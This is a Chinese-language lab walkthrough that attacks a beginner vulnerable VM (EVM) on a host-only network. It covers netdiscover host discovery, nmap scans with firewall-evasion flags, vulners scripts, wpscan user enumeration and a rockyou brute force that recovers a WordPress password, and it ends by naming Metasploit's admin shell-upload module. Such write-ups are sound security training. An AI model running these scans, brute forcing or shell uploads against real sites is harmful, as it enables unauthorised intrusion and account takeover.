0x02 信息收集

主机发现

  1. netdiscover -i eth0 #选择仅主机模式网口
  2.   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
  3.  -----------------------------------------------------------------------------
  4.  192.168.56.1    0a:00:27:00:00:15      1      60  Unknown vendor
  5.  192.168.56.100  08:00:27:30:bc:cb      1      60  PCS Systemtechnik GmbH

Kali机器的IP为 192.168.56.101 ，以上探测到的 192.168.56.100就是EVM了

端口扫描

  1. nmap -sV -p- 192.168.56.101
  2. Host is up (0.00023s latency).
  3. All 65535 scanned ports on 192.168.56.100 are filtered

所有端口被过滤了，怀疑EVM上设置了端口流量防火墙策略

参考文章：https://resources.infosecinstitute.com/nmap-evade-firewall-scripting/#gref

进行 Evade Firewall/IDS扫描

  1. nmap -sA 192.168.56.100 #ACK扫描
  2. nmap -sW 192.168.56.100 #TCP窗口扫描
  3. nmap -f 192.168.56.100  #报文分段
  4. nmap --spoof-mac Cisco 192.168.56.100 #伪造mac

均宣告失败，这个确定是初级难度？

排查一遍之后，发现是EVM虚拟机导入的时候新增NAT网卡致使网络设置未生效，嘤嘤嘤

重新导入，重新以上步骤

  1. netdisvover -i eth0

  3. 192.168.56.1    0a:00:27:00:00:15      1      60  Unknown vendor
  4. 192.168.56.100  08:00:27:ca:fe:db      1      60  PCS Systemtechnik GmbH      
  5. 192.168.56.103  08:00:27:6d:a5:91      3     180  PCS Systemtechnik GmbH

EVM的正确IP为 192.168.56.103 ，以下进行端口扫描

0x03 漏洞发现

nmap vulners

先使用nmap vuln脚本探测一下

  1. nmap --script=smb-check-vulns.nse -p445 192.168.56.103
  2. nmap --script=http-enum 192.168.56.103
  3. nmap --script=samba-vuln-cve-2012-1182 -p 139 192.168.56.103

均无效，使用vulners脚本检测一下是否存在CVE

这里参考：https://www.freebuf.com/sectool/161664.html

  1. cd /usr/share/nmap/scripts/
  2. git clone https://github.com/vulnersCom/nmap-vulners.git
  3. git clone https://github.com/scipag/vulscan.git
  4. proxychains git clone https://github.com/scipag/vulscan.git
  5. cd vulscan/utilities/updater
  6. chmod +x updateFiles.sh | ./updateFiles.sh

  8. nmap --script nmap-vulners -sV 192.168.56.103

看起来很多，测试了最新几个CVE，均无法利用

wpscan

之前目录遍历，收集到wordpress路径，自然而然想到用wpscan探测一番

  1. wpscan --url http://192.168.56.103/wordpress/ -e u -e at -e ap

以上命令的含义为枚举所有用户名，安装主题、插件

发现用户：c0rrupt3d_brain

wp版本5.2.4，安装默认主题，未安装插件

搜索一下wordpress 5.2.4有无漏洞

浏览了一下基本上没有可获得shell的漏洞

0x04 漏洞利用

以上获取了wp的用户名，接下来使用wpscan对其进行密码爆破，字典当然选择Kali下最强大的字典rockyou囖

  1. wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt

成功获取到c0rrupt3d_brain用户的密码：24992499

获得访问权限后，我们可以使用metasploit上集成的wpadminshell_upload上传shellcode
